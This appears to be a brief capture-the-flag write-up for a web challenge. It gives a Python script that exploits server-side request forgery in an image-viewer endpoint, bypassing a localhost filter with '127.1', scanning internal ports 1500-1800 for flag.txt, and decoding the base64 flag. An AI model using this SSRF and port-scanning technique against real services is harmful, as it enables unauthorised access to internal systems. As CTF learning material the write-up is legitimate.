#web-hacking
# Payload
```python
import requests

URL = "http://host3.dreamhack.games:12356/img_viewer"
payload = f"127.1:port/flag.txt"

for i in range(1500, 1801):
    data = {
        "url": f"http://{payload.replace('port', str(i))}"
    }
    response = requests.post(URL, data=data)
    print(f"Trying port {i}...")
    if response.text.find("iVBORw0KGgoAAAANSUhEUgAAA") == -1:
        print("Found the flag!")
        print(response.text)
        break
```
- 이후 찾은 페이로드를 직접 실행해 보고, 이미지가 깨져서 나오는데 개발자 도구로 확인하여 base64로 인코딩된 플래그를 디코딩하면 원래의 플래그를 찾을 수 있다.
